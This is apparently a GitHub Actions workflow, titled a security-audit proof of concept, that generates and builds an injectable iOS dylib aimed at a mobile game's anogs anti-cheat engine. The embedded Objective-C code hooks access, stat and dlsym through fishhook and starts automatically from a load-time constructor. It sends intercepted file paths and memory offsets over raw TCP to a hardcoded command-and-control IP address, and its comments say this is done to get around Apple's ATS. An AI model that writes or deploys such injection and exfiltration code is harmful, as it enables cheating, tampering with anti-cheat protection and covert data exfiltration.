name: Security Audit - anogs Telemetry Interceptor PoC

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build_poc:
    name: Compile Dylib Payload
    runs-on: macos-latest

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Download Fishhook Submodule
        run: |
          mkdir -p jni
          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h

      - name: Generate C++ Payload (Main.mm)
        run: |
          cat <<'EOF' > jni/main.mm
          #import <Foundation/Foundation.h>
          #import <sys/socket.h>
          #import <arpa/inet.h>
          #import <dlfcn.h>
          #include "fishhook.h"

          /**
           * ========================================================
           * 🛡️ VULNERABILITY PoC: ANTI-CHEAT TELEMETRY INTERCEPTION
           * 👨‍💻 RESEARCHER: MASOUD (NASIRIYAH)
           * 🎯 TARGET ENGINE: anogs.dylib
           * * DESCRIPTION:
           * This payload demonstrates how an attacker can monitor the
           * Anti-Cheat engine in real-time, extracting exact memory
           * offsets (for IDA Pro patching) by hooking libc functions
           * and utilizing raw TCP sockets to bypass Apple's ATS filters.
           * ========================================================
           */

          // ⚠️ C2 Server Configuration (Masoud RDP)
          #define C2_IP "44.192.33.117"
          #define C2_PORT 8080

          // Original function pointers
          static int (*orig_access)(const char *path, int amode);
          static int (*orig_stat)(const char *path, struct stat *buf);
          static void* (*orig_dlsym)(void* handle, const char* symbol);

          /**
           * @brief Sends intercepted telemetry to the C2 Server via Raw TCP.
           * Uses dispatch_async to prevent blocking the game's main thread.
           */
          void ExfiltrateTelemetry(NSDictionary *telemetryData) {
              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                  NSData *jsonData = [NSJSONSerialization dataWithJSONObject:telemetryData options:0 error:nil];
                  if (!jsonData) return;

                  int sock = socket(AF_INET, SOCK_STREAM, 0);
                  if (sock < 0) return;

                  struct sockaddr_in server_addr;
                  server_addr.sin_family = AF_INET;
                  server_addr.sin_port = htons(C2_PORT);
                  inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);

                  // 1-second timeout to prevent lag spikes in the host app
                  struct timeval timeout = {1, 0}; 
                  setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

                  if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
                      send(sock, [jsonData bytes], [jsonData length], 0);
                  }
                  close(sock);
              });
          }

          /**
           * @brief Resolves the caller's address and calculates the IDA offset.
           */
          void AnalyzeAndExfiltrate(const char* function_name, const char* target_param) {
              void* ret_addr = __builtin_return_address(0);
              Dl_info info;
              
              if (dladdr(ret_addr, &info) && info.dli_fname) {
                  NSString *caller = [[NSString stringWithUTF8String:info.dli_fname] lowercaseString];
                  
                  // Filter: Only intercept if the caller is the Anti-Cheat engine or main game
                  if ([caller containsString:@"anogs"] || [caller containsString:@"shadowtracker"]) {
                      // Calculate exact binary offset: Execution Address - Base Address
                      uintptr_t offset = (uintptr_t)ret_addr - (uintptr_t)info.dli_fbase;
                      
                      ExfiltrateTelemetry(@{
                          @"func": [NSString stringWithUTF8String:function_name],
                          @"offset": [NSString stringWithFormat:@"0x%lx", offset],
                          @"target": target_param ? [NSString stringWithUTF8String:target_param] : @"NULL"
                      });
                  }
              }
          }

          // ==================== HOOK DEFINITIONS ====================

          int hk_access(const char *path, int amode) {
              AnalyzeAndExfiltrate("access", path);
              return orig_access(path, amode);
          }

          int hk_stat(const char *path, struct stat *buf) {
              AnalyzeAndExfiltrate("stat", path);
              return orig_stat(path, buf);
          }

          void* hk_dlsym(void* handle, const char* symbol) {
              AnalyzeAndExfiltrate("dlsym", symbol);
              return orig_dlsym(handle, symbol);
          }

          // ==================== INJECTION ENTRY ====================

          __attribute__((constructor))
          static void InjectPayload() {
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                  // Send initialization ping
                  ExfiltrateTelemetry(@{@"func": @"RADAR_INIT", @"offset": @"0x0", @"target": @"Connection Established"});

                  // Apply Fishhook
                  struct rebinding hooks[] = {
                      {"access", (void *)hk_access, (void **)&orig_access},
                      {"stat", (void *)hk_stat, (void **)&orig_stat},
                      {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym}
                  };
                  rebind_symbols(hooks, 3);
              });
          }
          EOF

      - name: Compile Dylib
        run: |
          clang++ -dynamiclib -std=c++11 -arch arm64 \
          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
          jni/main.mm jni/fishhook.c -o Anogs-Telemetry-PoC.dylib \
          -framework Foundation
          strip -x Anogs-Telemetry-PoC.dylib

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Anogs-Telemetry-PoC
          path: Anogs-Telemetry-PoC.dylib
